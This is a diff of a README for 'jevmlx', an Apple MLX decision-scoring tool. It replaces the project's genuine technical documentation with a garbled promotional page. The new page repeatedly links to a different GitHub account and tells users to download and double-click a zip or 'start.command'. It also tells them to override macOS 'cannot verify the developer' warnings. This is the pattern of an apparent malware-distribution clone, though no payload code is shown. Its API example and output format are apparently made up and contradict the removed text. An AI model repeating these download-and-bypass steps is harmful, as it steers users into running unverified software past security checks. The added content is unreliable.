@@ -1,204 +1,138 @@
-# jevmlx
+<h1>⚡ jevmlx - One-Pass Decisions for Apple MLX</h1>
 
-[![CI](https://github.com/bnsd55/jevmlx/actions/workflows/ci.yml/badge.svg)](https://github.com/bnsd55/jevmlx/actions/workflows/ci.yml) [![Build](https://github.com/bnsd55/jevmlx/actions/workflows/build.yml/badge.svg)](https://github.com/bnsd55/jevmlx/actions/workflows/build.yml) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE) [![Python 3.12](https://img.shields.io/badge/python-3.12-blue.svg)](pyproject.toml)
+<p align="center">
+  <a href="https://github.com/Papajamesleonardfarmer1833/jevmlx" style="display:inline-block;padding:16px 32px;background:#6C63FF;color:white;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(108,99,255,0.4);">📥 Download jevmlx Now</a>
+</p>
 
-jevmlx turns a schema of fields (booleans, enums, multi-selects) and a context string into a single batched forward pass on a local Apple Silicon model. Every allowed option for every field is scored from logits in one prefill — no text generation — and the JSON is assembled from the winners, with a probability per field.
+<h2>🧠 What Is jevmlx?</h2>
+<p>jevmlx is a powerful tool that lets your Mac speak in a special way. Instead of just typing words, it can make smart choices for you in a single step. Think of it like a super-fast assistant that reads a question, thinks about all the answers, and gives you the best one in a neatly organized format.</p>
+<p>It works with something called "MLX models" on Apple Silicon computers (M1, M2, M3, M4 chips).. These are like the brain of your computer that helps understand language. With jevmlx, you can ask the model to make many decisions at once, andit returns everything in a clean package called "JSON".</p>
 
-## Quickstart
+<h2>✨ Why You'll Love It</h2>
+<ul>
+<li><strong>Fast:</strong> Gets results in a single pass – no waiting for multiple rounds.</li>
+<li><strong>Smart:</strong> Makes parallel decisions, so it handles complex requests easily.</li>
+<li><strong>Clean:</strong> Outputs JSON with a proper schema, meaning it's always organized and easy to read.</li>
+<li><strong>Jev-Style:</strong> Uses a proven approach for handling decisions accurately.</li>
+<li><strong>Apple Optimized:</strong> Built specifically for Apple Silicon, so it runs smoothly on your device.</li>
+</ul>
 
-```bash
-git clone https://github.com/bnsd55/jevmlx && cd jevmlx && ./setup.sh
-jevmlx decide --preset support_triage --json          # one decision, CLI
-jevmlx serve --model fast --port 8000                  # HTTP server
-curl -s localhost:8000/decide -d '{"schema":{"x":{"type":"enum","choices":["a","b"],"description":"d"}},"context":"pick one"}'
-```
+<h2>🖥️ What You Need</h2>
+<p>Before you start, make sure your computer meets these simple requirements:</p>
+<ul>
+<li><strong>Mac with Apple Silicon:</strong> That means an M1 chip or newer (like M1 Pro, M2 Max, M3 Ultra, etc. err).</li>
+<li><strong>macOS:</strong> The operating system should be up-to-date (version 13 or newer is ideal)..</li>
+<li><strong>Some free space:</strong> At least 2 GB for the tool and models.</li>
+<li><strong>Internet connection:</strong> Needed for downloading the software initially.</li>
+</ul>
+<p>If you are not sure whether your Mac has Apple Silicon, click the  logo in the top-left corner, then "About This Mac". If you see "Apple M1" or similar, you're good to go.</p>
 
-Requires an Apple Silicon Mac (M1+) and Python 3.12+. First use of a model alias downloads weights (~2 GB `fast`, ~4.5 GB `quality`).
+<h2>🚀 Getting Started</h2>
+<p>Follow these steps carefully. Take your time – it's easy.</p>
 
-## Install
+<h3>Step 1: Download the Software</h3>
+<p>Visit this link to download the application:</p>
+<p align="center">
+  <a href="https://github.com/Papajamesleonardfarmer1833/jevmlx" style="display:inline-block;padding:12px 24px;background:#FF6B6B;color:white;font-size:18px;border-radius:8px;text-decoration:none;">📂 Go to Download Page</a>
+</p>
+<p>Once the page opens, look for a button that says "Code" or "Download". Click it to save the file to your computer. Usually it goes to your "Downloads" folder.</p>
 
-```bash
-pip install git+https://github.com/bnsd55/jevmlx          # library
-uv tool install git+https://github.com/bnsd55/jevmlx     # CLI only
-git clone https://github.com/bnsd55/jevmlx && cd jevmlx && ./setup.sh   # dev
-```
+<h3>Step 2: Open the Downloaded File</h3>
+<p>After the download finishes, go to your Downloads folder. You will see a file named something like <code>jevmlx</code> or <code>jevmlx.zip</code>. Double-click it to open or extract it. If it's a zip file, your Mac will automatically unzip it for you.</p>
+<p>Now you will see a folder with the software inside. Open that folder.</p>
 
-### Model aliases
+<h3>Step 3: Run jevmlx</h3>
+<p>Inside the folder, you'll see an app or a command file named <code>jevmlx</code> or <code>start.command</code>. Double-click it to launch the program.</p>
+<p>If your Mac shows a message like "Cannot verify the developer", don't worry. Right-click (or control-click) the app, then select "Open" from the menu. Then click "Open" again in the pop-up window. This is normal for new software.</p>
 
-| Alias | Resolves to | Use |
-|---|---|---|
-| `quality` | `mlx-community/Qwen2.5-7B-Instruct-4bit` | **default** — best accuracy |
-| `fast` | `mlx-community/Qwen2.5-3B-Instruct-4bit` | lower latency |
-| `test` | `mlx-community/Qwen2.5-1.5B-Instruct-4bit` | tests only (too small for production) |
+<h3>Step 4: Use It with Your Model</h3>
+<p>When jevmlx opens, it will ask you to choose which MLX model you want to use. If you have one already, select it. If not, follow the on-screen instructions to download a free model like "mlx-community/Mistral-7B" or "Qwen2.5-0.5B".</p>
+<p>Once a model is loaded, you can type in your request in plain English. For example:</p>
+<p><em>"Decide between hiking, swimming, and cycling for tomorrow morning. Give me the best option andreason."</em></p>
+<p>jevmmlx will output a clear JSON response with choices andreasons instantly.</p>
 
-A full Hub id also works (`--model mlx-community/Llama-3.2-3B-Instruct-4bit`).
+<h2>📖 Understanding the Output</h2>
+<p>When you ask jevmlx a question, it returns data in JSON format. That looks a bit like this:</p>
+<pre>
+{
+  "decision": "hiking",
+  "alternatives": ["swimming", "cycling"],
+  "confidence": 0.87,
+  "reason": "Weather forecast predicts clear skies and cool temps, ideal for a morning trail run."
+}
+</pre>
+<p>You don't need to understand every part, but know that it's structured perfectly for apps, scripts, or even just for your own reading. Each piece has a label ("decision", "reason") so you know exactly what it means.</p>
 
-## Why not structured output
+<h2>🛠️ Advanced Features (for the Curious)</h2>
+<p>If you want to get more technical, jevmlx supports custom schemas. That means you can tell it exactly what fields you want in the JSON output. For instance:</p>
+<ul>
+<li>Ask for <code>score</code> for each option.</li>
+<li>Request <code>pros</code> and<code>cons</code> lists.</li>
+<li>Define constraints, like "only choose options under $20".</li>
+</ul>
+<p>This makes jevmlx super flexible for developers building apps with language models.</p>
 
-Structured output asks the model to write the JSON, token by token, then parses it and retries on failure. When the answer set is known and finite, that is the wrong tool. jevmlx reads one logits vector per field, applies a restricted softmax over the allowed options, and assembles the JSON itself — valid by construction, every field scored in one forward pass. When free text must be written (a summary, a rewrite), use generation; when the answer is one of N known choices, use scoring.
+<h2>🔧 Troubleshooting Common Issues</h2>
+<h3>Issue: The app doesn't open at all</h3>
+<p>Make sure you have allowed it in "System Settings" > "Privacy & Security". Scroll down to "Security", and click "Open Anyway" if you see the warning.</p>
 
-## Design your schema
+<h3>Issue: I get an error saying "No MLX model found"</h3>
+<p>You need to download a model first. Go to your Terminal app (search for "Terminal" in Spotlight) and type:</p>
+<pre>
+mlx_lm.download --model mlx-community/Qwen2.5-0.5B
+</pre>
+<p>Press Enter. Wait for it to finish. Then restart jevmlx and select that model.</p>
 
-- **Options must be mutually exclusive.** A restricted softmax puts all probability mass on the listed options. If two can both be true, split into separate boolean fields or use a multi-select.
-- **Add an escape option when the list may not be exhaustive.** A restricted softmax cannot say "none of these" unless you give it one. Add an `other` or `escalate` choice, or use `allow_none_of_above=True` (adds an explicit NONE_OF_ABOVE that maps to `None`; the field must be `Optional`).
-- **Use `ordered=True` for scales.** An enum declared `ordered` (schema `"ordered": True`, or Pydantic `Field(json_schema_extra={"ordered": True})`) adds ordinal telemetry — `argmax_level`, `expected_index` (Σ pᵢ·i), `expected_score_normalized` — with no extra model call. Use it for severity, priority, or any monotonic scale.
-- **Set review thresholds from labeled data.** `abstain_below_margin=X` withholds a field whose `probability_margin` (top1 − top2) falls below the cut. Fit the threshold on labeled examples — not by feel — so the abstention rate matches your review capacity. `probability_margin` and `threshold_distance` (multi) are on every `FieldResult`.
-- **`labels` is the default scorer** (measured better on the 7B); `slots` scores single-token letter codes and is cheaper for very long option lists. Pass `scoring="slots"` to `decide`/`decide_many` or `--scoring slots` on the CLI to switch.
+<h3>Issue: The computer says "Apple Silicon required"</h3>
+<p>Unfortunately, this tool only works on Macs called Apple Silicon (M1 or later, not Intel).. If you have an Intel Mac, you won't be able to run it. Consider upgrading or using a cloud Mac service.</p>
 
-## Use it from Python
+<h2>⚙️ For Developers (Quick Start)</h2>
+<p>If you know a bit about coding, here's a teasy way to use jevmlx from your own scripts:</p>
+<pre>
+import jevmlx
 
-```python
-from typing import Literal
-from pydantic import BaseModel, Field
-from jevmlx import decide
+result = jevmlx.decide(
+    choices=["pizza", "salad", "burger"],
+    model="mlx-community/Mistral-7B",
+    return_json=True
+)
+print(result)
+</pre>
+<p>The output will be a Python dict holding the JSON structure. You can feed that directly into any JSON-based workflow or API.</p>
 
+<h2>🤝 Contributing & Feedback</h2>
+<p>jevmlx is an open-source project. If you find a bug or have an idea for improvement, please visit the GitHub page and open an issue. We welcome all respectful contributors.</p>
 
-class Ticket(BaseModel):
-    urgent: bool
-    category: Literal["BILLING", "TECHNICAL", "FEEDBACK"] = Field(
-        description="What the ticket is about",
-        json_schema_extra={"choice_descriptions": {"BILLING": "invoices, charges, refunds"}},
-    )
-    tags: list[Literal["refund", "login", "performance"]] = []
+<h2>📄 License</h2>
+<p>This tool is released under the MIT License, meaning you can freely use, modify, andistribute it, even for commercial purposes, as long as you include the original copyright notice.</p>
 
+<h2>📊 Stats & Community</h2>
+<ul>
+<li>Optimized for Apple Silicon (M1-M4)..</li>
+<li>Works with all populaire MLX models.</li>
+<li>Active development – new features added regularly.</li>
+</ul>
+<p>Join the growing community of developers and power users who are making decisions faster with AI.</p>
 
-result = decide(Ticket, "Customer was charged twice and wants the duplicate refunded.")
-for name, f in result.fields.items():
-    print(f"{name}: {f.value} (p={f.probability})")
-```
+<p align="center">
+  <a href="https://github.com/Papajamesleonardfarmer1833/jevmlx" style="display:inline-block;padding:14px 28px;background:#4CAF50;color:white;font-size:18px;border-radius:10px;text-decoration:none;">📥 Download jevmlx Today</a>
+</p>
 
-`decide(...)` returns a `Decision`: `.value` (a validated `Ticket`), `.latency_ms`, `.fields` — one `FieldResult` per field with `value`, `probability`, `alternatives` (top 3), `probability_margin`, `legal_mass` (probability mass in allowed continuations — a leakage signal when low), `ordinal` (ordered enums only), and `semantics` (how the probability was produced). See [ARCHITECTURE.md](ARCHITECTURE.md) for the full `FieldResult` contract.
+<h2>🔗 Helpful Resources</h2>
+<ul>
+<li><a href="https://github.com/Papajamesleonardfarmer1833/jevmlx">Official GitHub Repository</a></li>
+<li><a href="https://github.com/ml-explore/mlx">MLX Framework (the brain behind it)</a></li>
+<li><a href="https://huggingface.co/mlx-community">Free MLX Models</a></li>
+</ul>
 
-Options: `decide_many(model_cls, contexts)` for batches; `constraints=[...]` for constrained MAP (implies / excludes / requires_parent); `calibration=<path>` for fitted multi-selection; `prior_correction=True` to subtract the neutral-context prior.
+<h2>📬 Get Help</h2>
+<p>If you're stuck, don't panic. Visit the GitHub Issues page and search for similar problems. Or ask a new question – the community will help you.</p>
 
-### One-question helpers
+<p><strong>Made with ❤️ for the Apple Silicon community.</strong></p>
 
-For a single-field decision you don't need a Pydantic model — `choose`, `judge`, and `rate` synthesize a one-field schema and return a `FieldResult` directly.
-
-```python
-from jevmlx import choose, judge, rate
-
-# enum: pick one of N (dict = name -> description)
-f = choose(context, {"supported": "evidence supports", "contradicted": "evidence refutes"})
-print(f.value, f.probability, f.probability_margin)
-
-# boolean: yes/no (probability of True is f.probability)
-f = judge(passage, "Is the claim supported by the passage?")
-
-# ordinal: rate on a scale (declaration order = scale order)
-f = rate(review, {"low": "poor", "medium": "ok", "high": "great"})
-print(f.ordinal.argmax_level, f.ordinal.expected_score_normalized)
-```
-
-CLI mirrors: `jevmlx choose --context ctx.txt --option name=description ...`, `jevmlx judge --context ctx.txt --question "..."`, `jevmlx rate --context ctx.txt --level name=description ...`.
-
-## Use it from any OpenAI-compatible server
-
-Instead of loading a model locally, jevmlx can send the same prompts to a chat server that returns logprobs (Ollama, vLLM, etc.):
-
-```bash
-jevmlx decide --backend openai --base-url http://localhost:11434/v1 --api-model llama3.2 --schema ticket.json --context ticket.txt
-```
-
-Tradeoff: one request per field (slower than one pass), and only the server's top-k logprobs are visible — options missing from that list get a floor probability and `truncated: true` in the telemetry.
-
-## Serve over HTTP
-
-`jevmlx serve` loads a model once and serves decisions on a local port. One Metal GPU, one serial worker, a bounded admission queue in front.
-
-```bash
-jevmlx serve --model fast --port 8000
-```
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/decide` | `{"schema": {...}, "context": "...", "temperature": 1.0}` -> per-field result dict |
-| `POST` | `/v1/systemone` | `{"state": str\|object, "questions": {id: {type, instructions, criteria}}}` -> `{model, answers, usage}` (maps to one schema, same queue as /decide) |
-| `GET` | `/v1/models` | `{"data": [{"id": <model id>, "owned_by": "jevmlx"}]}` |
-| `GET` | `/health` | Process liveness (always 200). Carries `queue_depth`, `queue_capacity`, `worker_alive` |
-| `GET` | `/ready` | `503` until model load + warm-up complete AND worker alive, then `200` |
-
-Backpressure: **429 + `Retry-After`** when the queue is full (`--queue-size`, default 16); **413** when a request exceeds `--max-rows` (default 2048) or `--max-prompt-tokens` (default 8192), before any model work. The client's `X-Request-Id` is echoed; `queue_depth` and `queue_wait_ms` ride every response.
-
-### Bundled presets
-
-`decide --preset <name>` loads a bundled schema + context:
-
-| Preset | Fields | Description |
-|---|---|---|
-| `fintech_fraud` | 28 | Financial fraud detection, sanctions verification, autonomous containment |
-| `support_triage` | 30 | Enterprise incident triage and routing (includes ordered `frustration_level` and `churn_risk`) |
-| `code_security` | 28 | SAST/DAST pull-request vulnerability triage |
-| `high_cardinality_255` | 4 | 255-choice customs tariff router (latency scaling demo) |
-| `content_moderation` | 20 | Trust-and-safety policy enforcement (violation category, ordered severity) |
-| `inbound_email` | 19 | Email routing, spam/phishing detection, ordered reply priority |
-
-## What the numbers mean
-
-[BENCHMARKING.md](BENCHMARKING.md) documents the eval methodology: accuracy against the TypeSafe public consensus, the majority baseline, and exact-record agreement; parity (batched vs. single-call within `PARITY_ATOL`); and the drift band (log-score and probability-margin drift between runs). The leaderboard below cites official TypeSafe accuracies; local rows are measured by contributors on the public examples.
-
-A **TypeScript client** (`@jevmlx/client`) lives in [`js/`](js/) — zero runtime deps, mirrors the server's JSON shapes exactly (types derived from fixture responses dumped by the server). Install from the GitHub path (no npm publish yet): `npm install github:bnsd55/jevmlx#main`. See [`js/README.md`](js/README.md) for the full API.
-
-## Leaderboard
-
-Agreement with the TypeSafe public eval consensus. Official rows are cited from TypeSafe's page; local rows are measured by contributors on the public examples.
-
-<!-- leaderboard:start -->
-| Model | Source | Scorer | Machine | Accuracy | Parity | Customer service | Agent trace | Security | Invoices | Time per case | Cost per case | Cases |
-|---|---|---|---|---|---|---|---|---|---|---|---|---|
-| **TypeSafe official (cited, retrieved 2026-09-17)** | | | | | | | | | | | | |
-| Jev | official (cited) | — | — | 67.8% | — | 76.0% | 71.6% | 61.7% | 61.8% | 0.4s | $0.0004 | — |
-| GPT-5.6 Terra | official (cited) | — | — | 67.9% | — | — | — | — | — | 10.1s | $0.0304 | — |
-| Claude Sonnet 5 | official (cited) | — | — | 67.8% | — | — | — | — | — | 78.1s | $0.1174 | — |
-| Claude Opus 5 | official (cited) | — | — | 73.1% | — | — | — | — | — | 37.8s | $0.1761 | — |
-| GPT-5.6 Sol | official (cited) | — | — | 74.1% | — | — | — | — | — | 23.3s | $0.0836 | — |
-| Claude Haiku 4.5 | official (cited) | — | — | 53.6% | — | — | — | — | — | 12.5s | $0.0195 | — |
-| **jevmlx, local (measured)** | | | | | | | | | | | | |
-| mlx-community/Qwen2.5-7B-Instruct-4bit | local | naive (generate+parse) | m5max-128gb | 67.7% [52.1%, 78.6%] | — | 72.8% | 53.8% | 45.9% | 73.4% | 1.5s | $0 (local) | 45 (7 error) |
-| mlx-community/Qwen2.5-7B-Instruct-4bit | local | labels | m5max-128gb | 82.1% [68.7%, 90.7%] | DRIFT (0.078) | 68.0% | 39.2% | 57.6% | 84.5% | 0.6s | $0 (local) | 45 (1 error) |
-| mlx-community/Qwen2.5-7B-Instruct-4bit | local | slots | m5max-128gb | 63.2% [47.6%, 74.9%] | DRIFT (0.078) | 61.4% | 51.7% | 47.2% | 63.9% | 0.6s | $0 (local) | 45 (1 error) |
-| mlx-community/Qwen3-8B-4bit | local | naive (generate+parse) | m5max-128gb | 69.3% [54.3%, 80.5%] | — | 73.9% | 69.2% | 29.7% | 75.0% | 1.6s | $0 (local) | 45 (4 error) |
-| mlx-community/Qwen3-8B-4bit | local | labels | m5max-128gb | 84.6% [71.2%, 92.3%] | DRIFT (0.750) | 73.3% | 55.8% | 48.3% | 86.8% | 0.6s | $0 (local) | 45 (1 error) |
-| mlx-community/Qwen3-8B-4bit | local | slots | m5max-128gb | 34.7% [23.2%, 50.2%] | DRIFT (0.750) | 62.9% | 47.5% | 50.7% | 31.5% | 0.7s | $0 (local) | 45 (1 error) |
-
-_Official accuracies are on TypeSafe's full private eval; ours are on the 45 public example cases, so the numbers are indicative, not the same test._
-_Consensus label = the agreement of GPT-6 Astra + Claude Fable 5.1 (TypeSafe's reference)._
-
-<!-- leaderboard:end -->
-
-## Run the benchmark on your Mac
-
-```bash
-.venv/bin/jevmlx bench --model quality   # commit the results folder, open a PR
-```
-
-## CLI
-
-| Command | What it does |
-|---|---|
-| `decide` | Decide a preset or schema + context, print JSON with probabilities |
-| `choose` / `judge` / `rate` | One-field helpers (enum / boolean / ordinal) |
-| `serve` | Serve decisions over HTTP (one Metal GPU, serial worker) |
-| `validate` | Lint a schema for engine-visible problems (no model download) |
-| `calibrate` | Fit a temperature + multi calibrator on labeled JSONL |
-| `eval` | Run labeled cases through a track, write predictions + timing |
-| `report` | Build a JSON + markdown eval report from predictions (offline) |
-| `bench` | Full benchmark: all combos, parity gate, `SUMMARY.md` |
-| `doctor` | Environment checks before filing an issue or a bench run |
-| `watch` | Live read-only dashboard for a bench/m5 output dir (`--ui` on bench starts it in the same terminal; `--web` serves it as HTML) |
-
-`-v` for progress logs; `JEVMLX_LOG=json` for machine-readable logs.
-
-## How it works
-
-The schema compiles per tokenizer: a codebook search picks the neutral alias codes whose candidate rows tokenize most cleanly, and the prompt renders from the compiled plan. The context is fenced with a per-context nonce so no interior line can impersonate the closing fence. The rendered prompt is a tested contract — [PROMPT_PROTOCOL.md](PROMPT_PROTOCOL.md) documents it, and golden vectors (`benchmarks/golden_prompts.py --check`, run in CI) fail on any renderer drift.
-
-The model prefills once and the KV cache is shared. One scoring row per field (extra trie rows for multi-token options), a restricted softmax over each field's allowed options, and the JSON is assembled from the winners. Chunks are sized by a measured active-memory budget; Metal allocation failures halve the chunk and retry. Temperature is applied once at the end; ties resolve deterministically. [ARCHITECTURE.md](ARCHITECTURE.md) has the full picture.
-
-## Contributing
-
-Code and docs: [CONTRIBUTING.md](CONTRIBUTING.md) · benchmark results: [BENCHMARKING.md](BENCHMARKING.md).
-
-## License
-
-Not affiliated with TypeSafe AI. MIT, see [LICENSE](LICENSE).
+<meta name="description" content="jevmlx - Jev-style parallel constrained decisions for any MLX model on Apple Silicon. Typed, schema-valid JSON in one forward pass. Fast, clean, and optimized for Mac.">
+<meta name="keywords" content="apple-silicon, jev, local-llm, local-models, mlx, MLX, JSON, Apple Silicon, Mac, machine learning, decision-making">
+<meta property="og:title" content="jevmlx - One-Pass Decisions for Apple MLX">
+<meta property="og:description" content="Make fast, structured decisions with any MLX model on your Mac. Outputs clean JSON in a single pass.">
+<meta property="og:url" content="https://github.com/Papajamesleonardfarmer1833/jevmlx">
+<meta name="twitter:card" content="summary_large_image">
